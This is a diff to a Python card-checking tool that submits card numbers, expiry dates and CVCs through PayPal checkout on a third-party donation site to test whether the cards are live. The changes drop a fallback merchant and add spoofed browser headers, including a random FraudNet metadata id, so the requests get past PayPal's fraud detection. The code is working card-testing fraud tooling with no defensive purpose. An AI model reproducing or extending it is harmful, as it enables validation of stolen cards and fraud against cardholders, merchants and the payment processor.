@@ -5,6 +5,7 @@ import re
 import random
 import string
 import asyncio
+import uuid
 
 def _generate_email():
     domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
@@ -137,19 +138,18 @@ def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
             if order_match:
                 order_id = order_match.group(1)
             else:
-                # Cloudflare 403 or WAF block on awwatersheds -> Fallback to secondary PayPal commerce engine
-                try:
-                    from .pp2_lounsbury import check_card_paypal_lounsbury_sync
-                    return check_card_paypal_lounsbury_sync(cc, mm, yy, cvc, proxy_url=proxy_url)
-                except Exception:
-                    return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"
+                return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"
 
         # Step 4: Pay with card via PayPal GraphQL
+        fraudnet_session_id = uuid.uuid4().hex
         headers_paypal = {
             'Accept': '*/*',
             'Content-Type': 'application/json',
             'Origin': 'https://www.paypal.com',
+            'Referer': 'https://www.paypal.com/smart/card-fields',
             'paypal-client-context': order_id,
+            'paypal-client-metadata-id': fraudnet_session_id,
+            'x-requested-with': 'XMLHttpRequest',
             'x-app-name': 'standardcardfields',
             'x-country': 'US',
         }
